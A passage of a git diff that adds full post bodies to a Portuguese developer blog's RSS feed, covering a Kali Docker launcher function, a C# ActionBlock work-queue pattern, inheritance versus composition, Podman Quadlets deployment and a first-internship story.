+        if [ ! &quot;$(docker ps -q -f name=kali-lab)&quot; ]; then
+            echo &quot;Iniciando kali-lab...&quot;
+            docker start kali-lab
+        fi
+        # Entra no container
+        docker exec -it kali-lab /bin/bash
+    else
+        echo &quot;Erro: O container &#39;kali-lab&#39; não existe. Execute o comando &#39;docker run&#39; primeiro.&quot;
+    fi
+}
+</code></pre>
+<p>Após essa função adicionada no arquivo <code>~/.bashrc</code>, basta executar <code>kali</code> no terminal para acessar o ambiente.</p>
+<pre><code class="language-bash">~ ❯ kali
+┌──(root㉿omarchy)-[/]
+└─# bom hacking!
+</code></pre>
+<p>Feito!</p>]]></content:encoded>
     <pubDate>Fri, 20 Mar 2026 21:22:25 GMT</pubDate>
   </item>
   <item>
@@ -38,6 +495,88 @@
     <link>https://daniloflorenzano.com.br/posts/fila-dinamica-action-block-dotnet-tpl</link>
     <guid>https://daniloflorenzano.com.br/posts/fila-dinamica-action-block-dotnet-tpl</guid>
     <description><![CDATA[Uma alternativa melhor ao Parallel.Foreach quando há necessidade de recursão indeterminada]]></description>
+    <content:encoded><![CDATA[<blockquote>
+<p><em>“TPL Dataflow é uma mistura interessante de tecnologias assíncronas e paralelas. Ela é útil quando você tem uma sequência de processos que precisam ser aplicados aos seus dados.”</em><br>— <em>Stephen Cleary, Concurrency in C# Cookbook</em></p>
+</blockquote>
+<hr>
+<p>Recentemente precisei percorrer uma árvore de categorias recursiva — começando com cerca de 20 nós raiz, cada um contendo um número desconhecido de subcategorias (e sub-subcategorias, e assim por diante).</p>
+<p>Esse tipo de <strong>carga de trabalho que se expande dinamicamente</strong> não funciona bem com ferramentas de paralelismo estático como <code>Parallel.ForEach</code>.</p>
+<hr>
+<h2 id="o-problema-distribuição-estática-de-trabalho">O Problema: Distribuição Estática de Trabalho</h2>
+<p>Se executarmos um <code>Parallel.ForEach</code> nas 20 categorias raiz:</p>
+<ul>
+<li><strong>Thread 1</strong> pode pegar um ramo pequeno e terminar em 1 segundo.  </li>
+<li><strong>Thread 2</strong> pode pegar um ramo enorme e levar 10 minutos.</li>
+</ul>
+<p>Mesmo com <code>MaxDegreeOfParallelism = 50</code>, a maioria das threads termina cedo e fica ociosa — enquanto algumas ficam presas processando árvores profundas e pesadas.<br><strong>Resultado: desequilíbrio de carga e desperdício de recursos.</strong></p>
+<hr>
+<h2 id="a-solução-actionblockt-como-fila-de-trabalho-dinâmica">A Solução: <code>ActionBlock&lt;T&gt;</code> como Fila de Trabalho Dinâmica</h2>
+<p><a href="https://learn.microsoft.com/en-us/dotnet/api/system.threading.tasks.dataflow.actionblock-1"><code>ActionBlock&lt;T&gt;</code></a>, da biblioteca TPL Dataflow, fornece uma <strong>fila centralizada e thread-safe</strong> com <strong>geração dinâmica de tarefas</strong> e <strong>controle de concorrência</strong>.</p>
+<p>A ideia é simples:</p>
+<ol>
+<li>Criar um único <code>ActionBlock&lt;CategoryNode&gt;</code> com um limite fixo de concorrência.  </li>
+<li>“Iniciar” o bloco com as categorias raiz.  </li>
+<li>Cada worker processa seu nó, encontra as subcategorias e as <strong>reposta</strong> no mesmo <code>ActionBlock</code>.  </li>
+<li>O bloco continua processando até que todos os itens (atuais e pendentes) sejam concluídos.</li>
+</ol>
+<p>Esse padrão funciona como uma <strong>fila recursiva e auto-balanceada</strong> — todas as threads permanecem ocupadas até que toda a árvore seja processada.</p>
+<hr>
+<h2 id="exemplo-de-implementação">Exemplo de Implementação</h2>
+<pre><code class="language-csharp">public class MultithreadTreeParser
+{
+    private int _activeItems;
+    private ActionBlock&lt;CategoryNode&gt; _actionBlock = null!;
+
+    public async Task&lt;int&gt; StartAsync()
+    {
+        var rootNode = await GetDepartmentsRootNodeAsync()
+            ?? throw new Exception(&quot;Falha ao obter nó raiz&quot;);
+
+        var options = new ExecutionDataflowBlockOptions
+        {
+            MaxDegreeOfParallelism = 5
+        };
+
+        _actionBlock = new ActionBlock&lt;CategoryNode&gt;(async node =&gt;
+        {
+            try
+            {
+                await ProcessCategoryAsync(node);
+
+                var subs = node.SubCategories;
+                if (subs.Count &gt; 0)
+                {
+                    Interlocked.Add(ref _activeItems, subs.Count);
+                    foreach (var sub in subs)
+                        await _actionBlock.SendAsync(sub);
+                }
+            }
+            finally
+            {
+                var remaining = Interlocked.Decrement(ref _activeItems);
+                if (remaining == 0)
+                    _actionBlock.Complete();
+            }
+        }, options);
+
+        var rootSubs = rootNode.SubCategories;
+        Interlocked.Add(ref _activeItems, rootSubs.Count);
+
+        foreach (var sub in rootSubs)
+            await _actionBlock.SendAsync(sub);
+
+        await _actionBlock.Completion;
+        return 0;
+    }
+}
+</code></pre>
+<h2 id="por-que-isso-funciona">Por Que Isso Funciona</h2>
+<ul>
+<li>Balanceamento dinâmico de carga: As threads consomem de uma fila compartilhada. Assim que terminam uma tarefa, pegam a próxima disponível.</li>
+<li>Expansão recursiva de trabalho: Cada tarefa pode adicionar novas tarefas de forma segura na mesma fila.</li>
+<li>Paralelismo controlado: MaxDegreeOfParallelism mantém o uso de recursos sob controle.</li>
+<li>Encerramento limpo: _activeItems rastreia o número de tarefas em andamento — quando chega a zero, o pipeline é finalizado de forma ordenada.</li>
+</ul>]]></content:encoded>
     <pubDate>Sun, 02 Nov 2025 23:04:22 GMT</pubDate>
   </item>
   <item>
@@ -45,6 +584,31 @@
     <link>https://daniloflorenzano.com.br/posts/heranca-versus-composicao</link>
     <guid>https://daniloflorenzano.com.br/posts/heranca-versus-composicao</guid>
     <description><![CDATA[Guia rápido para decidir entre herança e composição na Programação Orientada a Objetos.]]></description>
+    <content:encoded><![CDATA[<h2 id="como-decidir">Como decidir</h2>
+<p>Usar <strong>herança</strong> quando precisar de:</p>
+<ul>
+<li>reaproveitamento de código</li>
+<li>polimorfismo</li>
+</ul>
+<p>Usar <strong>composição</strong> quando precisar de:</p>
+<ul>
+<li>reaproveitamento de código</li>
+</ul>
+<p>Usar uma <strong>interface</strong> quando precisar de:</p>
+<ul>
+<li>polimorfismo</li>
+</ul>
+<p><strong>Ou seja, a herança é bem vinda quando, e somente quando, as duas necessidades forem verdade. Do contrario, prefira sempre composição.</strong></p>
+<p>É importante ressaltar que a herança pode levar a um acoplamento mais forte entre as classes, o que pode dificultar a manutenção e evolução do código.
+A composição, por outro lado, promove um acoplamento mais fraco, permitindo maior flexibilidade e reutilização de componentes. Por isso, muitos autores recomendam a composição como uma abordagem preferencial na Programação Orientada a Objetos.</p>
+<h2 id="exemplo">Exemplo</h2>
+<p>No exemplo da imagem, a herança não é justificada porque nenhuma das classes herdeiras sobrescreve o método da classe principal (polimorfismo), apenas é reaproveitado o <code>Metodo1()</code> (reaproveitamento de código).
+Nesse caso, como apenas um dos requisitos é preenchido, é melhor usar composição.</p>
+<p><img src="https://daniloflorenzano.com.br/posts/heranca-versus-composicao/composicao.png" alt="composicao"></p>
+<p>Há também a abordagem de não usar herança mesmo em casos que preencham os dois requisitos. Pois ambos podem ser satisfeitos através da combinação de interfaces e composição.</p>
+<p><img src="https://daniloflorenzano.com.br/posts/heranca-versus-composicao/composicao-com-interface.png" alt="composicao com interface"></p>
+<h2 id="referência">Referência</h2>
+<p><a href="https://www.youtube.com/watch?v=C3B5IIlt4-0">Only Use Inheritance If You Want Both of These - by Christopher Okhravi</a></p>]]></content:encoded>
     <pubDate>Sun, 08 Jun 2025 15:14:01 GMT</pubDate>
   </item>
   <item>
@@ -52,6 +616,65 @@
     <link>https://daniloflorenzano.com.br/posts/podman-com-quadlets</link>
     <guid>https://daniloflorenzano.com.br/posts/podman-com-quadlets</guid>
     <description><![CDATA[Como criar um ambiente de produção com Podman no Linux]]></description>
+    <content:encoded><![CDATA[<p>Aluguei uma VPS e queria disponibilizar uma API que desenvolvi.</p>
+<p>Optei por utilizar contêineres. A escolha do <strong>Podman</strong> foi feita considerando o objetivo de melhorar minha afinidade com a ferramenta e, também, usufruir da integração nativa com o <strong>systemd</strong>.</p>
+<p>Para atingir um resultado satisfatório, considerando a inicialização dos contêineres no boot e a possibilidade de acompanhar logs pelo <code>journalctl</code>, executei os seguintes passos:</p>
+<hr>
+<ol>
+<li><p>Criei um pod com os contêineres necessários.</p>
+</li>
+<li><p>Gerei um arquivo YAML para Kubernetes a partir do pod:</p>
+<pre><code class="language-bash">podman generate kube xpto-pod -f /tmp/my_pod_kube.yaml
+</code></pre>
+</li>
+<li><p>Criei um arquivo <code>.kube</code>, referenciando o <code>.yaml</code> gerado:</p>
+<p> <strong>xpto-pod.kube</strong></p>
+<pre><code>[Unit]
+Description=Serviço XPTO
+After=network-online.target
+Wants=network-online.target
+
+[Install]
+WantedBy=multi-user.target
+
+[Service]
+Restart=on-failure
+RestartSec=5s
+TimeoutStartSec=900
+
+[Kube]
+Yaml=/tmp/my_pod_kube.yaml
+PublishPort=8080:80
+LogDriver=journald
+SetWorkingDirectory=yaml
+KubeDownForce=true
+</code></pre>
+<blockquote>
+<p><strong>Obs</strong>: A seção <code>[Install]</code> é essencial para que o systemd inicie o pod automaticamente no boot.</p>
+</blockquote>
+</li>
+<li><p>Movi o arquivo para a pasta correta:</p>
+<pre><code class="language-bash">sudo mv xpto-pod.kube /etc/containers/systemd/
+</code></pre>
+</li>
+<li><p>Recarreguei os serviços do systemd:</p>
+<pre><code class="language-bash">sudo systemctl daemon-reexec
+sudo systemctl daemon-reload
+</code></pre>
+</li>
+<li><p>Finalizado! Para verificar se o serviço está em execução:</p>
+<pre><code class="language-bash">systemctl status xpto-pod.service
+</code></pre>
+</li>
+</ol>
+<hr>
+<p>Continuo explorando formas de usar o <strong>Podman</strong> e suas ferramentas e integrações.</p>
+<p><strong>Fontes que utilizei para alcançar esse resultado:</strong></p>
+<ul>
+<li><a href="https://www.youtube.com/live/LsZB_mI7TcQ?si=ZKEaWhoXwgrhYves">Quadlets, Pods, and working with the latest Podman, Podman 5</a>  </li>
+<li><a href="https://oracle-base.com/articles/linux/podman-generate-and-play-kubernetes-yaml-files">Podman: Generate and Play Kubernetes YAML Files</a>  </li>
+<li><a href="https://docs.podman.io/en/latest/markdown/podman-systemd.unit.5.html">Documentação oficial: podman-systemd.unit</a></li>
+</ul>]]></content:encoded>
     <pubDate>Sun, 08 Jun 2025 15:06:13 GMT</pubDate>
   </item>
   <item>
@@ -59,6 +682,92 @@
     <link>https://daniloflorenzano.com.br/posts/meu-primeiro-estagio</link>
     <guid>https://daniloflorenzano.com.br/posts/meu-primeiro-estagio</guid>
     <description><![CDATA[Um pouco sobre como foi minha experiência pra conseguir a primeira vaga na área.]]></description>
+    <content:encoded><![CDATA[<p>
+	Conseguir a primeira vaga, seja de estágio ou Dev Jr, pra muitos, assim como
+	foi pra mim, é o primeiro grande desafio da área. Muito mais difícil que
+	fazer uma API ou um Front-end para consumí-la, não é?
+</p>
+
+<p>
+	Não é tão simples determinar o que me fez conseguir o estágio, até porque, no
+	fim, tudo o que eu fiz até hoje tenho certeza que me favoreceu na entrevista.
+	Então vou contar um pouco do que fiz.
+</p>
+
+<p>
+	A pouco mais de 1 ano atrás, comecei na programação através de um evento da
+	plataforma de cursos Alura, se não me engano se chamava "Imersão DEV". Foi
+	uma semana de aulas básicas de HTML, CSS e JavaScript com alguns desafios
+	bens legais. Ao mesmo tempo que participava do evento, eu comecei a assistir
+	as aulas de JavaScript do professor Gustavo Guanabara, do canal Curso em
+	Vídeo.
+</p>
+
+<p>
+	Um mês depois, em Junho de 2021, consegui um emprego de Técnico de
+	Informática (já tinha uma boa base de redes) em um hospital e ao mesmo tempo
+	decidi assinar a Alura. Durante um ano trabalhando e estudando, apliquei para
+	muitas, mas muitas vagas mesmo. E durante 10 meses eu não consegui sequer uma
+	entrevista. Mas aprendi muito, montei diversos projetos no Github, consegui
+	certificados, fiz bons amigos que também estavam estudando, fiz boas conexões
+	no Linkedin e o mais importante de tudo: em Janeiro de 2022
+	<b>entrei pra faculdade de Sistemas!</b>
+</p>
+
+<p>
+	A faculdade me abriu a possibilidade de me inscrever para vagas de estágio, e
+	isso fez uma baita diferença. Se você aplica para vagas de Dev Jr que não
+	requerem ensino superior e nem experiência, já deve ter notado que na maioria
+	das vezes acaba concorrendo com outros mil participantes, e estando numa
+	faculdade, você fica elegível para vagas menos concorridas, que filtram os
+	que estejam ao menos cursando o ensino superior.
+</p>
+
+<p>
+	Então nos últimos 6 meses, eu passei a aplicar para vagas de estágio também.
+	Em Maio eu encontrei uma vaga em um
+	<a target="_blank" href="https://www.linkedin.com/groups/9184036/"
+		>grupo de divulgação de vagas de estágio e Jr no linkedin</a
+	>
+	e mandei meu currículo e uma carta de apresentação para o email que estava
+	descrito no post. Na semana seguinte, me responderam perguntando se eu tinha
+	realmente interesse e anexado um PDF com mais informações sobre a vaga, e
+	depois da minha confirmação me envinou um formulário com um tempo determinado
+	para ser preenchido com diversas perguntas daquelas que sempre vemos nos
+	processos seletivos mesmo. Mas o diferencial dessa foi que ao final do
+	formulário houve um teste técnico, onde tive que escrever um comando SQL
+	pedido e também desenvolver, em qualquer linguagem, alguns métodos de
+	manipulação de Array.
+</p>
+
+<p>
+	Duas semanas depois de eu ter enviado a resposta do formulário, entrei em
+	contato perguntando sobre o processo. Me pediram desculpas pela demora da
+	resposta e disseram que tiveram um número muito grande de candidatos, mais de
+	70 (já fiquei muito feliz, pois estava acostumado com concorrer com mais de
+	mil) e me perguntaram se tinha disponibilidade para uma entrevista. Óbvio que
+	tinha, estava a 1 ano esperando por isso! Então na mesma semana fui
+	entrevistado pelo Dev Sênior que me explicou que dos mais de 70
+	participantes, só 30 responderam o teste técnico e desse, só 6 haviam
+	respondido de forma coerente. E depois disso me pediu para explicar o
+	raciocínio que eu tive para desenvolver o que havia sido pedido. O resto da
+	entrevista foi uma conversa bem descontraída em quem eu ia contando minhas
+	experiências para o entrevistador e respondia perguntas como: "Como você
+	construiria uma API?", "Entende algo sobre POO?", "Qual sua familiaridade com
+	SQL?" e algumas outras sobre tecnologias específicas. E foi nesse momento que
+	eu percebi que consegui a entrevista no momento certo, pois eu não estaria
+	preparado para responder a essas perguntas com tanta tranquilidade se ela
+	tivesse acontecido antes.
+</p>
+
+<p>
+	O resultado da entrevista foi o meu tão almejado sim! E agora estou me
+	desdobrando pra aprender C# e conseguir ajudar a equipe que me acolheu e me
+	deu essa oportunidade. Espero ter experiências interessantes pra contar em
+	futuros posts aqui e no meu Linkedin. Caso ainda tenha alguma dúvida ou
+	queira conversar, me chama
+	<a href="https://www.linkedin.com/in/daniloflorenzano/">aqui!</a>
+</p>]]></content:encoded>
     <pubDate>Sun, 26 Jun 2022 17:11:57 GMT</pubDate>
   </item>
 </channel>
